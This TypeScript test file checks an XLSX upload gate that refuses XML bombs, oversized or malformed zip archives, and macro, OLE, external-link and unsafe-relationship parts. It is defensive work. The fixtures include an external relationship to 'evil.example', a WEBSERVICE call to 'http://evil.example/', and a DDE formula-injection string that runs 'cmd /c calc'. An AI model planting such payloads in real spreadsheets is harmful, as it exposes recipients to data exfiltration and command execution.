      (_, i): Relationship => [PADDING_REL, `p${i}`],
    );
    const file = buildXlsxFixture([BASIC_SHEET], {
      '_rels/.rels': relsXml([OFFICE_DOCUMENT_RELATIONSHIP, ...padding]),
      'xl/media/image1.png': 'not xml <<<',
    });
    const names = Object.keys(openUpload(file, SMALL_BUDGET));
    expect(catchGuard(file, SMALL_BUDGET)).toBeNull();
    expect(names).not.toContain('_rels/.rels');
    expect(names).not.toContain('xl/media/image1.png');
  });

  it('accepts a part at the namespace-declaration cap and rejects one more', () => {
    const atLimit = withSharedStrings(partWithXmlns(MAX_XMLNS_DECLARATIONS_PER_PART));
    const overLimit = withSharedStrings(partWithXmlns(MAX_XMLNS_DECLARATIONS_PER_PART + 1));

    expect(catchGuard(atLimit, opts)).toBeNull();
    expect(catchGuard(overLimit, opts)?.code).toBe('UNSAFE_CONTENT');
  });

  // xmldom resolves namespaces per element against every enclosing declaration:
  // nested declarations make the parse quadratic in depth.
  it('rejects nested namespace declarations over the cap quickly as UNSAFE_CONTENT', () => {
    const file = withStyles(partWithXmlns(NESTED_XMLNS_COUNT));
    const started = performance.now();
    const err = catchGuard(file, opts);
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(performance.now() - started).toBeLessThan(FAST_REJECT_MS);
  });

  it('caps namespace declarations at 256 per part', () => {
    expect(MAX_XMLNS_DECLARATIONS_PER_PART).toBe(256);
  });

  it('weighs an element 8, an attribute 3 and a text-like node 3, up to 5 000 000', () => {
    expect([XML_ELEMENT_WEIGHT, XML_ATTRIBUTE_WEIGHT, XML_TEXT_NODE_WEIGHT]).toEqual([8, 3, 3]);
    expect(MAX_XML_DOM_WEIGHT).toBe(5_000_000);
  });

  // The product limit the weight budget sets: a real Trendyol export of 5 000 rows by
  // 35 columns fits; a sheet that wide of distinct shared strings, or 64 columns of
  // values, does not.
  it('fits a real Trendyol workbook grown to 5 001 rows within the weight budget', () => {
    expect(domWeight(grownFixtureText(WIDEST_TRENDYOL_FIXTURE, FULL_ROWS))).toBeLessThan(
      MAX_XML_DOM_WEIGHT,
    );
  });

  it('rejects a 5 001 x 64 sheet of numbers as PAYLOAD_TOO_LARGE', () => {
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetXml(numberRows(FULL_ROWS, WIDE_COLUMNS)) },
    ]);
    expect(catchGuard(file, opts)?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  it('rejects a 5 001 x 35 sheet of distinct shared strings as PAYLOAD_TOO_LARGE', () => {
    const { sheet, strings } = sharedStringSheet(FULL_ROWS, TRENDYOL_COLUMNS);
    const file = buildXlsxFixture([{ name: 'Sheet1', xml: sheet }], {
      [WORKBOOK_RELS_PART]: relsXml([SHEET_RELATIONSHIP, SHARED_STRINGS_RELATIONSHIP]),
      [SHARED_STRINGS_PART]: strings,
    });
    expect(catchGuard(file, opts)?.code).toBe('PAYLOAD_TOO_LARGE');
  });

  // Excel repeats xmlns:xm on every x14:conditionalFormatting of a worksheet.
  it('accepts a worksheet with 70 x14 conditional formats', async () => {
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: conditionalFormatSheetXml(CONDITIONAL_FORMATS) },
    ]);
    expect(await readWorkbookGrid(file)).toEqual(BASIC_ROWS);
  });

  it('rejects an archive whose central directory cannot be read as CORRUPT_FILE', () => {
    const file = buildXlsxFixture([{ name: 'Sheet1', xml: worksheetXml([['Barkod'], ['B1']]) }]);
    const err = catchGuard(breakEndOfCentralDirectory(file), opts);
    expect(err).toBeInstanceOf(SpreadsheetFileError);
    expect(err?.code).toBe('CORRUPT_FILE');
    // The zip layout check, which runs before the stream, now refuses it first.
    expect(err?.meta).toMatchObject({ reason: ZIP_REJECT_REASONS.LAYOUT });
  });

  it('caps the decompressed size of all XML parts together at 32 MiB', () => {
    // A 32 MiB upload is too heavy for a unit test; the value itself is pinned.
    expect(MAX_XML_TOTAL_BYTES).toBe(32 * 1024 * 1024);
  });

  it('caps the decompressed size of all entries together at 64 MiB', () => {
    // A 64 MiB upload is too heavy for a unit test; the value itself is pinned and
    // the ceiling is exercised below through a lowered maxDecompressedBytes.
    expect(MAX_DECOMPRESSED_BYTES).toBe(64 * 1024 * 1024);
  });

  it('caps element names at 32 bytes', () => {
    expect(MAX_XML_NAME_LENGTH).toBe(32);
  });

  it('rejects a 33-character element name as UNSAFE_CONTENT', () => {
    const file = withSharedStrings(`<sst><${'a'.repeat(33)}/></sst>`);
    const err = catchGuard(file, opts);
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toEqual({
      detail: UNSAFE_CONTENT_DETAILS.ELEMENT_NAME_LENGTH,
      entry: SHARED_STRINGS_PART,
      cap: MAX_XML_NAME_LENGTH,
    });
  });

  // Element names are measured on raw bytes in every part the reader opens,
  // including the parts it reads unchanged (sharedStrings here).
  it.each([
    ['an element name one byte over the cap', `<sst><${OVERLONG_NAME}/></sst>`],
    [
      'a prefixed name one byte over the cap',
      `<sst><x:${'a'.repeat(MAX_XML_NAME_LENGTH - 1)}/></sst>`,
    ],
    ['an end tag name over the cap', `<sst></${OVERLONG_NAME}></sst>`],
    ['an over-long name that runs to the end of the part', `<sst><${OVERLONG_NAME}`],
  ])('rejects %s as UNSAFE_CONTENT', (_label, sharedStrings) => {
    expect(catchGuard(withSharedStrings(sharedStrings), opts)?.code).toBe('UNSAFE_CONTENT');
  });

  it.each([
    ['an element name at the cap', `<sst><${MAX_NAME}/></sst>`],
    ['a name at the cap ended by a line break', `<sst><${MAX_NAME}\n/></sst>`],
    ['a long comment', `<sst><!--${OVERLONG_NAME}--></sst>`],
    ['a long processing instruction', `<?${OVERLONG_NAME}?><sst/>`],
  ])('accepts %s', (_label, sharedStrings) => {
    expect(catchGuard(withSharedStrings(sharedStrings), opts)).toBeNull();
  });

  it('returns exactly the parts the reader opens', () => {
    const file = buildXlsxFixture([
      { name: 'Sheet1', xml: worksheetXml([['Barkod'], ['B1']], { dimension: 'A1:B2' }) },
    ]);
    expect(readerPartNames(file, opts)).toEqual(
      [WORKBOOK_RELS_PART, WORKBOOK_PART, SHEET_PART].sort(),
    );
  });
});

// The reader opens `xl/_rels/workbook.xml.rels`, `xl/workbook.xml` and the Target of
// every relationship typed styles, sharedStrings or worksheet (reader contract,
// section 1). The gate budgets, parses and returns exactly those parts; every other
// kept XML entry is only content-scanned, and every other entry only counted.
describe('upload gate: the parts the reader opens', () => {
  // The audit file: an element bomb over the whole weight budget in a part no
  // relationship names.
  it('never parses a part the workbook rels do not name', async () => {
    const file = buildXlsxFixture([BASIC_SHEET], {
      'xl/junk.xml': partWithElements(MAX_XML_DOM_WEIGHT / XML_ELEMENT_WEIGHT + 1),
    });

    expect(await readWorkbookGrid(file)).toEqual(BASIC_ROWS);
    expect(readerPartNames(file, SMALL_BUDGET)).not.toContain('xl/junk.xml');
  });

  it('leaves out a part named by a relationship of another type', () => {
    const file = workbookWith([SHEET_RELATIONSHIP, [THEME_REL, 'theme/theme1.xml']], {
      'xl/theme/theme1.xml': '<a:theme xmlns:a="urn:x"/>',
    });
    expect(readerPartNames(file, opts)).toEqual(
      [WORKBOOK_RELS_PART, WORKBOOK_PART, SHEET_PART].sort(),
    );
  });

  // The stream keeps every relationships part for the type rule; one not named
  // .xml / .xml.rels is never a reader part, so a sheet stored there is missing.
  it('never opens a kept relationships part named .rels only as a worksheet', () => {
    const file = workbookWith([[WORKSHEET_REL, BIN_RELS_SHEET_TARGET]], {
      [BIN_RELS_SHEET_PART]: `<worksheet xmlns="${SPREADSHEET_NS}"><sheetData/></worksheet>`,
    });
    const err = catchGuard(file, opts);
    expect(err?.code).toBe('CORRUPT_FILE');
    expect(err?.meta).toEqual({ entry: BIN_RELS_SHEET_PART });
  });

  it.each([
    ['a relative Target', 'worksheets/data.xml'],
    ['an absolute Target', '/xl/worksheets/data.xml'],
  ])('resolves %s the way the reader does', async (_label, target) => {
    const file = buildXlsxFixture([
      {
        name: 'Sheet1',
        xml: worksheetXml(BASIC_ROWS),
        partPath: 'xl/worksheets/data.xml',
        relTarget: target,
      },
    ]);

    expect(readerPartNames(file, opts)).toEqual(
      [WORKBOOK_RELS_PART, WORKBOOK_PART, 'xl/worksheets/data.xml'].sort(),
    );
    expect(await readWorkbookGrid(file)).toEqual(BASIC_ROWS);
  });

  it('finds Relationship elements by local name', () => {
    const file = buildXlsxFixture([BASIC_SHEET], {
      [WORKBOOK_RELS_PART]: relsXml([SHEET_RELATIONSHIP, SHARED_STRINGS_RELATIONSHIP], 'p'),
      [SHARED_STRINGS_PART]: `<sst xmlns="${SPREADSHEET_NS}"/>`,
    });
    expect(readerPartNames(file, opts)).toContain(SHARED_STRINGS_PART);
  });

  it.each<[string, Buffer]>([
    [
      'a worksheet missing from the archive',
      workbookWith([SHEET_RELATIONSHIP, [WORKSHEET_REL, 'worksheets/sheet9.xml']]),
    ],
    [
      'a shared strings part missing from the archive',
      workbookWith([SHEET_RELATIONSHIP, SHARED_STRINGS_RELATIONSHIP]),
    ],
    [
      'a worksheet the reader cannot open (not .xml)',
      buildXlsxFixture([
        {
          name: 'Sheet1',
          xml: worksheetXml(BASIC_ROWS),
          partPath: 'xl/worksheets/sheet1.bin',
          relTarget: 'worksheets/sheet1.bin',
        },
      ]),
    ],
    // No normalization: the reader looks up `xl/../xl/worksheets/sheet1.xml` as is.
    [
      'a Target with ".." that names the sheet only after normalization',
      workbookWith([[WORKSHEET_REL, '../xl/worksheets/sheet1.xml']]),
    ],
    [
      'a worksheet relationship without a Target',
      buildXlsxFixture([BASIC_SHEET], {
        [WORKBOOK_RELS_PART]: relsXml([SHEET_RELATIONSHIP]).replace(
          '</Relationships>',
          `<Relationship Id="rId9" Type="${WORKSHEET_REL}"/></Relationships>`,
        ),
      }),
    ],
  ])('rejects workbook rels naming %s as CORRUPT_FILE', (_label, file) => {
    expect(catchGuard(file, opts)?.code).toBe('CORRUPT_FILE');
  });

  it('rejects an archive without workbook rels as CORRUPT_FILE', () => {
    const entries = unzipSync(new Uint8Array(buildXlsxFixture([BASIC_SHEET])));
    const withoutRels = Object.fromEntries(
      Object.entries(entries).filter(([name]) => name !== WORKBOOK_RELS_PART),
    );
    expect(catchGuard(Buffer.from(zipSync(withoutRels)), opts)?.code).toBe('CORRUPT_FILE');
  });

  it('scans the workbook rels for a DOCTYPE before parsing it', () => {
    const rels = relsXml([SHEET_RELATIONSHIP]).replace(
      '<Relationships',
      '<!DOCTYPE r [<!ENTITY x "y">]><Relationships',
    );
    const file = buildXlsxFixture([BASIC_SHEET], { [WORKBOOK_RELS_PART]: rels });
    expect(catchGuard(file, opts)?.code).toBe('UNSAFE_CONTENT');
  });

  // Shapes Excel writes in parts the reader never opens; the old gate rejected them.
  it.each<[string, Readonly<Record<string, string>>]>([
    [
      `a drawing part with ${DRAWING_PICTURES} pictures (83 namespace declarations)`,
      {
        'xl/drawings/drawing1.xml': drawingXml(DRAWING_PICTURES),
        'xl/worksheets/_rels/sheet1.xml.rels': relsXml([
          [`${OFFICE_REL}/drawing`, '../drawings/drawing1.xml'],
        ]),
      },
    ],
    [
      'a custom XML part with a 40-character element name',
      {
        'customXml/item1.xml':
          `<?xml version="1.0"?><p:properties xmlns:p="urn:x">` +
          `<${CUSTOM_XML_NAME}>x</${CUSTOM_XML_NAME}></p:properties>`,
      },
    ],
    [
      'a part the reader never opens at the namespace-declaration cap',
      { 'xl/custom/ns.xml': partWithXmlns(MAX_XMLNS_DECLARATIONS_PER_PART) },
    ],
  ])('accepts %s', async (_label, parts) => {
    const file = buildXlsxFixture([BASIC_SHEET], parts);
    expect(await readWorkbookGrid(file)).toEqual(BASIC_ROWS);
  });

  // The content scan keeps the namespace bindings of every kept XML part in memory
  // bounded by the cap, so a part the reader never opens is held to it too, with the
  // error the reader parts get.
  it('refuses a part the reader never opens over the namespace-declaration cap', () => {
    const entry = 'xl/custom/ns.xml';
    const file = buildXlsxFixture([BASIC_SHEET], {
      [entry]: partWithXmlns(MAX_XMLNS_DECLARATIONS_PER_PART + 1),
    });
    const err = catchGuard(file, opts);
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toEqual({
      detail: UNSAFE_CONTENT_DETAILS.NAMESPACE_DECLARATIONS,
      entry,
      cap: MAX_XMLNS_DECLARATIONS_PER_PART,
    });
    expect(err?.message).toBe(
      `Workbook part '${entry}' has more than ${MAX_XMLNS_DECLARATIONS_PER_PART} namespace declarations`,
    );
  });

  // The export hands every part on unchanged, so every kept XML part is content-scanned,
  // the reader's or not (the content scan's own tests cover the formula rule there).
  it('refuses a document properties part with an unknown entity as UNSAFE_CONTENT', () => {
    const file = buildXlsxFixture([BASIC_SHEET], {
      'docProps/app.xml':
        '<?xml version="1.0"?><Properties><Company>A&nbsp;B</Company></Properties>',
    });
    const err = catchGuard(file, opts);
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toEqual({
      detail: UNSAFE_CONTENT_DETAILS.UNKNOWN_ENTITY,
      entry: 'docProps/app.xml',
    });
  });

  // Every entry is inflated and counted, the reader's or not: the export unzips the
  // stored upload whole, allocating each entry's declared size, so an image that
  // inflates past the cap must be refused at import.
  it('counts an entry the reader cannot open against the decompression cap', () => {
    const file = buildXlsxFixture([BASIC_SHEET], {
      'xl/media/image1.png': 'x'.repeat(IMAGE_BYTES),
    });
    expect(catchGuard(file, { ...opts, maxDecompressedBytes: SMALL_DECOMPRESSED_CAP })?.code).toBe(
      'PAYLOAD_TOO_LARGE',
    );
  });

  it('accepts an entry the reader cannot open within the decompression cap', () => {
    const file = buildXlsxFixture([BASIC_SHEET], {
      'xl/media/image1.png': 'x'.repeat(IMAGE_BYTES),
    });
    expect(catchGuard(file, opts)).toBeNull();
  });
});

// Hand-built stored (method 0) archives whose central directory can disagree with
// the local entries. The reader parts come from the local stream; the central
// directory is never inflated and must describe the same entries. readZipLayout, which
// runs before the stream, refuses each of these disagreements; only a declared size the
// data does not inflate to gets past it, and the gate's own size check refuses that.
const MINIMAL_PARTS: readonly StoredEntry[] = [
  { name: '[Content_Types].xml', text: '<Types/>' },
  { name: 'xl/workbook.xml', text: '<workbook/>' },
  { name: 'xl/_rels/workbook.xml.rels', text: '<Relationships/>' },
  { name: 'xl/extra.xml', text: '<extra/>' },
  { name: 'xl/media/image1.png', text: 'png' },
];
const EXTRA_PART = 3;
const IMAGE_ENTRY = 4;
const KEPT_RECORDS: readonly CentralRecord[] = [{ local: 0 }, { local: 1 }, { local: 2 }];

describe('upload gate: central directory', () => {
  it('accepts a stored archive whose central directory matches its local entries', () => {
    expect(catchGuard(storedZip(MINIMAL_PARTS), opts)).toBeNull();
  });

  it.each<[string, readonly CentralRecord[]]>([
    [
      'lists one local entry under a second name',
      [
        ...KEPT_RECORDS,
        { local: EXTRA_PART },
        { local: IMAGE_ENTRY },
        { local: EXTRA_PART, name: 'xl/overlap.xml' },
      ],
    ],
    [
      'repeats a name',
      [...KEPT_RECORDS, { local: EXTRA_PART }, { local: IMAGE_ENTRY }, { local: EXTRA_PART }],
    ],
    ['omits a local entry', [...KEPT_RECORDS, { local: EXTRA_PART }]],
    [
      'renames a local entry',
      [...KEPT_RECORDS, { local: EXTRA_PART, name: 'xl/other.xml' }, { local: IMAGE_ENTRY }],
    ],
    [
      'renames an entry the gate never inflates',
      [...KEPT_RECORDS, { local: EXTRA_PART }, { local: IMAGE_ENTRY, name: 'xl/media/other.png' }],
    ],
    [
      'declares a size the stream does not deliver',
      [...KEPT_RECORDS, { local: EXTRA_PART, originalSize: 1 }, { local: IMAGE_ENTRY }],
    ],
  ])('rejects a central directory that %s as CORRUPT_FILE', (_label, central) => {
    // The zip layout check, which runs before the stream, now refuses it first.
    expectGateReason(storedZip(MINIMAL_PARTS, central), 'CORRUPT_FILE', ZIP_REJECT_REASONS.LAYOUT);
  });

  // Every entry is inflated, so every declared size is checked against real bytes:
  // the export's unzipSync allocates the declared size of each entry, images too.
  it.each([
    ['a smaller', 1],
    ['a far larger', LARGE_DECLARED_SIZE],
  ])(
    'rejects %s declared size of an entry the reader cannot open as CORRUPT_FILE',
    (_label, originalSize) => {
      const central = [
        ...KEPT_RECORDS,
        { local: EXTRA_PART },
        { local: IMAGE_ENTRY, originalSize },
      ];
      // The zip layout check, which runs before the stream, now refuses it first.
      const file = storedZip(MINIMAL_PARTS, central);
      expectGateReason(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.LAYOUT);
    },
  );

  it('rejects more central-directory entries than MAX_ZIP_ENTRIES as CORRUPT_FILE', () => {
    const central: CentralRecord[] = [
      ...KEPT_RECORDS,
      { local: EXTRA_PART },
      { local: IMAGE_ENTRY },
    ];
    for (let i = 0; i < MAX_ZIP_ENTRIES; i += 1) {
      central.push({ local: EXTRA_PART, name: `xl/copy${i}.xml` });
    }
    // The zip layout check, which runs before the stream, now refuses it first.
    expectGateReason(storedZip(MINIMAL_PARTS, central), 'CORRUPT_FILE', ZIP_REJECT_REASONS.LAYOUT);
  });

  it.each([
    ['inflated entries', 'xl/extra.xml'],
    ['entries the gate never inflates', 'xl/media/image1.png'],
  ])('rejects two local %s with the same name as CORRUPT_FILE', (_label, name) => {
    const parts = [...MINIMAL_PARTS, { name, text: 'again' }];
    // The zip layout check, which runs before the stream, now refuses it first.
    expectGateReason(storedZip(parts), 'CORRUPT_FILE', ZIP_REJECT_REASONS.LAYOUT);
  });

  // readZipLayout inflates nothing: a deflated entry whose local header and directory
  // record agree on a size its data does not inflate to passes it, and only the gate's
  // comparison with the bytes the stream inflated refuses it.
  it.each([
    ['a smaller', 1],
    ['a far larger', LARGE_DECLARED_SIZE],
  ])(
    'rejects a deflated entry whose headers both declare %s size as CORRUPT_FILE',
    (_label, size) => {
      const file = withDeclaredSize(buildXlsxFixture([BASIC_SHEET]), SHEET_PART, size);
      expect(readZipLayout(file).entries.find((entry) => entry.name === SHEET_PART)).toMatchObject({
        method: DEFLATED_METHOD,
        uncompressedSize: size,
      });
      const err = catchGuard(file, opts);
      expect(err?.code).toBe('CORRUPT_FILE');
      expect(err?.meta).toEqual({ declared: size, actual: Buffer.byteLength(BASIC_SHEET.xml) });
    },
  );
});

// A part the root relationships may name instead of the workbook.
const OTHER_PART = 'xl/other.xml';
const OTHER_WORKBOOK_RELATIONSHIP = `<Relationship Id="rId2" Type="${OFFICE_DOCUMENT_REL}" Target="${OTHER_PART}"/>`;
const THUMBNAIL_REL =
  'http://schemas.openxmlformats.org/package/2006/relationships/metadata/thumbnail';
const BOMB_BYTES = 300_000;
const BOMB_CAP = 1_000;

/** The gate's error for `file` has `code` and `meta.reason`. */
function expectGateReason(file: Buffer, code: SpreadsheetFileErrorCode, reason: string): void {
  const err = catchGuard(file, opts);
  expect(err?.code).toBe(code);
  expect(err?.meta).toMatchObject({ reason });
}

/** The entries of `file` as `edit` returns them, zipped again. */
function rezipped(file: Buffer, edit: (entries: Unzipped) => Unzipped): Buffer {
  return Buffer.from(zipSync(edit(unzipSync(new Uint8Array(file)))));
}

/** The one-sheet workbook with `rootRels` as its root relationships part, plus `parts`. */
function withRootRels(rootRels: string, parts: Readonly<Record<string, string>> = {}): Buffer {
  return buildXlsxFixture([BASIC_SHEET], { [ROOT_RELS_PART]: rootRels, ...parts });
}

/** A root relationships part holding `relationship` as it is written. */
function rootRelsWith(relationship: string): string {
  return relsXml([]).replace('</Relationships>', `${relationship}</Relationships>`);
}

/** The one-sheet workbook with its root relationships part stored under `name` only. */
function withRootRelsNamed(name: string): Buffer {
  return rezipped(buildXlsxFixture([BASIC_SHEET]), (entries) =>
    Object.fromEntries(
      Object.entries(entries).map(([entry, bytes]) => [
        entry === ROOT_RELS_PART ? name : entry,
        bytes,
      ]),
    ),
  );
}

// The package's root relationships must name xl/workbook.xml as its office document,
// the part the reader opens: otherwise Excel would open another workbook than the one
// the gate read.
describe('upload gate: root relationships', () => {
  it('accepts the root relationships buildXlsxFixture writes', () => {
    expect(catchGuard(buildXlsxFixture([BASIC_SHEET]), opts)).toBeNull();
  });

  it('accepts an archive without root relationships', () => {
    const file = rezipped(buildXlsxFixture([BASIC_SHEET]), (entries) =>
      Object.fromEntries(Object.entries(entries).filter(([name]) => name !== ROOT_RELS_PART)),
    );
    expect(catchGuard(file, opts)).toBeNull();
  });

  it.each<[string, string]>([
    ['an absolute Target', relsXml([[OFFICE_DOCUMENT_REL, `/${WORKBOOK_PART}`]])],
    [
      'TargetMode="Internal"',
      rootRelsWith(
        `<Relationship Id="rId1" Type="${OFFICE_DOCUMENT_REL}" Target="${WORKBOOK_PART}" TargetMode="Internal"/>`,
      ),
    ],
  ])('accepts %s', (_label, rootRels) => {
    expect(catchGuard(withRootRels(rootRels), opts)).toBeNull();
  });

  it.each<[string, Buffer]>([
    [
      'an officeDocument Target that names another part of the archive',
      withRootRels(relsXml([[OFFICE_DOCUMENT_REL, OTHER_PART]]), { [OTHER_PART]: '<workbook/>' }),
    ],
    [
      'a second officeDocument relationship that names another part',
      withRootRels(relsXml([OFFICE_DOCUMENT_RELATIONSHIP, [OFFICE_DOCUMENT_REL, OTHER_PART]]), {
        [OTHER_PART]: '<workbook/>',
      }),
    ],
    [
      'no officeDocument relationship',
      withRootRels(relsXml([[EXTENDED_PROPERTIES_REL, 'docProps/app.xml']])),
    ],
    [
      'TargetMode="External"',
      withRootRels(
        rootRelsWith(
          `<Relationship Id="rId1" Type="${OFFICE_DOCUMENT_REL}" Target="${WORKBOOK_PART}" TargetMode="External"/>`,
        ),
      ),
    ],
    [
      'an unquoted attribute',
      withRootRels(
        rootRelsWith(
          `<Relationship Id=rId1 Type="${OFFICE_DOCUMENT_REL}" Target="${WORKBOOK_PART}"/>`,
        ),
      ),
    ],
    [
      'a Target written with a character reference',
      withRootRels(relsXml([[OFFICE_DOCUMENT_REL, 'xl/workbook&#46;xml']])),
    ],
    [
      'an officeDocument Type in another ASCII case beside the real one',
      withRootRels(
        relsXml([OFFICE_DOCUMENT_RELATIONSHIP, [`${OFFICE_REL}/OfficeDocument`, OTHER_PART]]),
        { [OTHER_PART]: '<workbook/>' },
      ),
    ],
    [
      'an entry named _RELS/.rels beside _rels/.rels',
      buildXlsxFixture([BASIC_SHEET], {
        [UPPER_CASE_ROOT_RELS_PART]: relsXml([OFFICE_DOCUMENT_RELATIONSHIP]),
      }),
    ],
    ['an entry named _RELS/.rels alone', withRootRelsNamed(UPPER_CASE_ROOT_RELS_PART)],
    ['only an XML declaration', withRootRels(XML_DECLARATION)],
    [
      'a UTF-7 declaration hiding a second officeDocument relationship',
      withRootRels(
        relsXml([OFFICE_DOCUMENT_RELATIONSHIP])
          .replace(XML_DECLARATION, UTF7_DECLARATION)
          .replace(
            '</Relationships>',
            `${utf7Markup(OTHER_WORKBOOK_RELATIONSHIP)}</Relationships>`,
          ),
        { [OTHER_PART]: '<workbook/>' },
      ),
    ],
    [
      'a second officeDocument relationship below a direct child of the root',
      withRootRels(
        relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replace(
          '</Relationships>',
          `<W>${OTHER_WORKBOOK_RELATIONSHIP}</W></Relationships>`,
        ),
        { [OTHER_PART]: '<workbook/>' },
      ),
    ],
  ])('refuses %s as CORRUPT_FILE', (_label, file) => {
    expectGateReason(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.ROOT_RELS);
  });

  it('refuses root relationships whose bytes are not UTF-8 as CORRUPT_FILE', () => {
    const text = relsXml([OFFICE_DOCUMENT_RELATIONSHIP]);
    const bytes = strToU8(text);
    // A Latin-1 byte inside an Id value: the lexer accepts any byte there.
    bytes[text.indexOf('rId1')] = LATIN1_E_ACUTE;
    const file = rezipped(buildXlsxFixture([BASIC_SHEET]), (entries) => ({
      ...entries,
      [ROOT_RELS_PART]: bytes,
    }));
    expectGateReason(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.ROOT_RELS);
  });

  // The UTF-8 text rule of every kept XML part: U+0000 is valid UTF-8, and the lexer
  // walk reads a comment without looking inside it.
  it('refuses root relationships holding U+0000 inside a comment as CORRUPT_FILE', () => {
    const rootRels = relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replace(
      '</Relationships>',
      '<!--a\u0000b--></Relationships>',
    );
    const err = catchGuard(withRootRels(rootRels), opts);
    expect(err?.code).toBe('CORRUPT_FILE');
    expect(err?.meta).toEqual({ reason: ZIP_REJECT_REASONS.ROOT_RELS, entry: ROOT_RELS_PART });
  });

  it('refuses an external relationship beside the office document as UNSAFE_CONTENT', () => {
    const rootRels = relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replace(
      '</Relationships>',
      `<Relationship Id="rId2" Type="${THUMBNAIL_REL}" Target="file://evil.example/t.jpeg" TargetMode="External"/></Relationships>`,
    );
    expectGateReason(withRootRels(rootRels), 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART);
  });

  it('refuses a DOCTYPE in the root relationships as UNSAFE_CONTENT', () => {
    const rootRels = relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replace(
      '<Relationships',
      '<!DOCTYPE r [<!ENTITY x "y">]><Relationships',
    );
    expect(catchGuard(withRootRels(rootRels), opts)?.code).toBe('UNSAFE_CONTENT');
  });

  it('refuses an unsafe relationship type in the root relationships as UNSAFE_CONTENT', () => {
    const rootRels = relsXml([OFFICE_DOCUMENT_RELATIONSHIP, [`${OFFICE_REL}/oleObject`, 'a.bin']]);
    expectGateReason(withRootRels(rootRels), 'UNSAFE_CONTENT', UNSAFE_CONTENT_REASONS.UNSAFE_PART);
  });

  it('refuses root relationships over MAX_WORKBOOK_RELS_BYTES as PAYLOAD_TOO_LARGE', () => {
    const rootRels = relsXml([OFFICE_DOCUMENT_RELATIONSHIP]).replace(
      '</Relationships>',
      `<!--${'x'.repeat(MAX_WORKBOOK_RELS_BYTES)}--></Relationships>`,
    );
    expect(catchGuard(withRootRels(rootRels), opts)?.code).toBe('PAYLOAD_TOO_LARGE');
  });
});

function isNonCanonicallyNamed(testCase: PackagePartCase): boolean {
  return testCase.nonCanonicalName === true;
}

/** The cases whose entry names the gate's entry name rule accepts. */
function canonicallyNamed(cases: readonly PackagePartCase[]): readonly PackagePartCase[] {
  return cases.filter((testCase) => !isNonCanonicallyNamed(testCase));
}

// The byte-preserving export would hand a macro, an embedded object or an external
// link one member uploaded to every other member unchanged.
describe('upload gate: unsafe parts by name', () => {
  it.each([
    'xl/vbaProject.bin',
    'XL/VBAPROJECT.BIN',
    'xl/externalLinks/externalLink1.xml',
    'xl/embeddings/oleObject1.bin',
  ])('refuses an entry named %s as UNSAFE_CONTENT active-part-name', (name) => {
    expectGateEntry(
      buildXlsxFixture([BASIC_SHEET], { [name]: '<x/>' }),
      'UNSAFE_CONTENT',
      UNSAFE_CONTENT_REASONS.UNSAFE_PART,
      name,
      UNSAFE_CONTENT_DETAILS.ACTIVE_PART_NAME,
    );
  });

  it('accepts an entry named xl/media/image1.png', () => {
    expect(
      catchGuard(buildXlsxFixture([BASIC_SHEET], { 'xl/media/image1.png': 'png' }), opts),
    ).toBeNull();
  });

  // The names come from the zip layout, before the stream inflates anything: an entry
  // that inflates past the decompression cap is refused for its name, not its size.
  it('refuses the name before inflating the entry', () => {
    const file = buildXlsxFixture([BASIC_SHEET], { 'xl/vbaProject.bin': '0'.repeat(BOMB_BYTES) });
    const err = catchGuard(file, { ...opts, maxDecompressedBytes: BOMB_CAP });
    expect(err?.code).toBe('UNSAFE_CONTENT');
    expect(err?.meta).toMatchObject({ reason: UNSAFE_CONTENT_REASONS.UNSAFE_PART });
  });
});

// Excel finds a macro, an external link or an embedded object through the content
// types and the relationships, never through the part's name.
describe('upload gate: unsafe parts by declared type', () => {
  it.each(canonicallyNamed(UNSAFE_PART_CASES))(
    'refuses $label as UNSAFE_CONTENT',
    ({ entries }) => {
      expectGateReason(
        buildXlsxFixture([BASIC_SHEET], entries),
        'UNSAFE_CONTENT',
        UNSAFE_CONTENT_REASONS.UNSAFE_PART,
      );
    },
  );

  it.each(canonicallyNamed(PACKAGE_PART_CASES))('refuses $label as CORRUPT_FILE', ({ entries }) => {
    expectGateReason(
      buildXlsxFixture([BASIC_SHEET], entries),
      'CORRUPT_FILE',
      ZIP_REJECT_REASONS.PACKAGE_PART,
    );
  });

  // The entry name rule runs before anything is inflated, so these never reach the rule.
  it.each([...UNSAFE_PART_CASES, ...PACKAGE_PART_CASES].filter(isNonCanonicallyNamed))(
    'refuses $label by its entry name as CORRUPT_FILE',
    ({ entries }) => {
      expectGateReason(
        buildXlsxFixture([BASIC_SHEET], entries),
        'CORRUPT_FILE',
        ZIP_REJECT_REASONS.ENTRY_NAME,
      );
    },
  );

  it.each(SAFE_PART_CASES)('accepts $label', ({ entries }) => {
    expect(catchGuard(buildXlsxFixture([BASIC_SHEET], entries), opts)).toBeNull();
  });

  it('refuses a relationships part whose bytes are not UTF-8 as CORRUPT_FILE', () => {
    const text = relsXml([[`${OFFICE_REL}/image`, '../media/image1.png']]);
    const bytes = strToU8(text);
    // A Latin-1 byte inside a Target value: the lexer accepts any byte there.
    bytes[text.indexOf('image1.png')] = LATIN1_E_ACUTE;
    const file = rezipped(buildXlsxFixture([BASIC_SHEET]), (entries) => ({
      ...entries,
      [SHEET_RELS_PART]: bytes,
    }));
    expectGateReason(file, 'CORRUPT_FILE', ZIP_REJECT_REASONS.PACKAGE_PART);
  });
});

const STRICT_WORKSHEET_REL = 'http://purl.oclc.org/ooxml/officeDocument/relationships/worksheet';
const BYTE_ORDER_MARK = '\ufeff';
const HYPERLINK_REL = `${OFFICE_REL}/hyperlink`;
const DRAWING_REL = `${OFFICE_REL}/drawing`;
const EVIL_CALL = 'WEBSERVICE(&quot;http://evil.example/&quot;)';
const DDE_LINK = "cmd|'/c calc'!A0";
